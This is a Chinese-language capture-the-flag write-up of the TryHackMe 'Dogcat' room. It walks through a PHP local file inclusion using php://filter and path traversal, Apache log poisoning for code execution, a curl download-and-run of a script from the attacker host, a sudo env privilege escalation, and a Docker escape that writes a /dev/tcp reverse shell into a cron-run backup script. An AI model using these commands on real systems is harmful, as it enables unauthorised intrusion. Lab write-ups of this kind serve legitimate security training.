---
title: Dogcat (Try Hack Me Writeup)
date: 2021-08-02T23:59:00+08:00
draft: false
url: "/2021/08/02/dogcat-try-hack-me-writeup/"
categories:
  - 滲透測試
  - Try Hack Me
showToc: true
TocOpen: false
---

> 
URL : https://tryhackme.com/room/dogcat

IP: 10.10.221.153  
第一次打 Medium 的題目

## Recon

- 先用老梗 `nmap -A 10.10.221.153`發現只有開 80 跟 22dirsearch- 發現基本上都沒有東西 QQ

## 瀏覽器亂逛

- http://10.10.221.153/![](/uploads/2022/02/53275-60cFGhz.png)
- 會發現可以選狗勾或貓貓選貓貓會出現![](/uploads/2022/02/97754-JGEBCKB.png)
- 網址是 `http://10.10.221.153/?view=cat`選狗勾- 網址是 `http://10.10.221.153/?view=dog`
- ~~不要問我為什麼不幫狗勾截圖~~嘗試 LFI- 這邊可以套一個 php 的 LFI 老梗 PHP Wrapper`http://10.10.221.153/?view=php://filter/convert.base64-encode/resource=cat`
- ![](/uploads/2022/02/cfee8-IaYSGCc.png)
- 可以發現成功噴出了一堆 base64`PGltZyBzcmM9ImNhdHMvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K`
- 解碼後發現是 `.jpg" />`
- 而同理解碼狗勾是 `.jpg" />`繞狗勾- 假設我們想要看 `/etc/passwd``http://10.10.221.153/?view=php://filter/convert.base64-encode/resource=/etc/passwd`
- ![](/uploads/2022/02/59c56-V6btRdB.png)
- 他會說 `Sorry, only dogs or cats are allowed.`而如果我們輸入 `/etc/passwddog`- 他會回傳 `Here you go!` 但是噴一些錯誤
- ![](/uploads/2022/02/8148b-BIxMS50.png)
- 因為找不到檔案，所以錯誤很合理那我們嘗試亂寫奇怪的路徑看看- `http://10.10.221.153/?view=php://filter/convert.base64-encode/resource=./dog/../dog`
- 會發現可以成功開啟狗勾嘗試觀察 `index.php` 內容 這邊只截錄重點

```php

```

- 可以發現參數 `ext` 很重要我們可以透過給予 `ext` 空白繞過副檔名任意 LFI- `http://10.10.221.153/?ext=&view=php://filter/convert.base64-encode/resource=./dog/../index.php`
- `http://10.10.221.153/?ext=&view=php://filter/convert.base64-encode/resource=./dog/../../../../../../../etc/passwd`
- `http://10.10.221.153/?ext=&view=php://filter/convert.base64-encode/resource=./dog/../../../../../../../etc/apache2/apache2.conf`
- `http://10.10.221.153/?ext=&view=php://filter/convert.base64-encode/resource=./dog/../../../../../../../var/log/apache2/access.log`可以發現 `access.log` 可讀![](/uploads/2022/02/9242b-ll0cYjt.png)
- 可以透過 `access.log` 來做到 LFI 2 RCELFI 2 RCE- 如果在瀏覽器輸入這個`10.10.221.153?A=`在 log 上會變成這樣- `/?A=%3C?php%20phpinfo();%20?%3C/php%3E`
- 主要是因為 HTTP 會做到 URL Encode所以可以用 nc- `nc 10.10.221.153 80`
- `GET /MEOW?`
- ![](/uploads/2022/02/61b12-JXxg8vP.png)成功!寫入 webshell- `nc 10.10.221.153 80`
- `GET /MEOW?`![](/uploads/2022/02/d7432-o2cJEwA.png)
- `http://10.10.221.153/?ext=&view=./dog/../../../../../../../var/log/apache2/access.log&A=curl%20-o%20/tmp/s%20http://10.13.21.55:8000/s`載入 reverse shell
- 在這邊發現這台電腦沒有 wget，所以用 curl`http://10.10.221.153/?ext=&view=./dog/../../../../../../../var/log/apache2/access.log&A=bash%20/tmp/s`- 執行 reverse shell
- 本地 `nc -vlk 7877`
- 就可以順利接到 Shell ㄌ!

## Shell

- 在`/var/www/flag.php`可以找到 flag1
- ![](/uploads/2022/02/6d0ed-1HiNozU.png)在 `/var/www/flag.php`- 可以找到 flag2
- ![](/uploads/2022/02/929e3-rYiIpeP.png)嘗試提權- 輸入 `sudo -l` 可以發現我們可以用 root 來 run `/usr/bin/env`
- ![](/uploads/2022/02/d41a4-ELIv9bq.png)這邊有兩種用法`/usr/bin/env ls /root`就可以用 roo 來 `ls /root`也可以參考 gtfobins- 有 suid 的 env
- `env /usr/bin/sh -p`取得 root flag (flag3)- `THM{D1ff3r3nt_3nv1ronments_874112}`

## Docker 提權

- 不管了，先老梗的 linpeas 下去`curl -o linpeas.sh 10.13.21.55:8000/linpeas.sh`
- `/usr/bin/env /tmp/linpeas.sh`
- ![](/uploads/2022/02/d7cdf-PlO1XxZ.png)可以發現根目錄有 `/.dockerenv`
- 確定目前我們在docker中發現備份檔案- ![](/uploads/2022/02/df514-DXOTRMs.png)
- 發現有 `backup.tar` 跟 `backup.sh`
- 試著把檔案複製到 `/var/www/html` 來準備下載![](/uploads/2022/02/be9b6-gZ2rLz8.png)下載並觀察備份檔案- `wget http://10.10.221.153/backup.tar`
- `tar xf backup.tar`觀察 Docker File- ![](/uploads/2022/02/cbdc7-M4K7rpx.png)發現沒什麼特別
- 但也發現為什麼 access log 一直有噴一個 `127.0.0.1` 的 curl觀察 `launch.sh`- ![](/uploads/2022/02/6d52c-U0Sdayw.png)
- 發現重點!!
- 他把 `/opt/backup` 掛載到本地的`/root/container/backup`所以我在 `/opt/backup` 寫資料會跑到本地端那問題就只剩下，我們怎麼讓本地執行觀察 `backup.sh`- 發現裡面就 `tar cf /root/container/backup/backup.tar /root/container`
- 但……本地端是怎麼執行的ㄋ??
- 突然發現上面的 `backup.tar` 就剛好是當前時間!所以可以推測說在遠端有一個 cron job寫入 `backup.sh`- 戳一個 reverse shell`echo "bash -c 'bash -i >& /dev/tcp/10.13.21.55/7878 0>&1'" >> backup.sh`
- ![](/uploads/2022/02/a40e8-i6PxwrU.png)本地端開 `nc -vlk 7878`- ![](/uploads/2022/02/345f2-J26jyNB.png)拿到本地 root shell! (flag4)- `THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}`
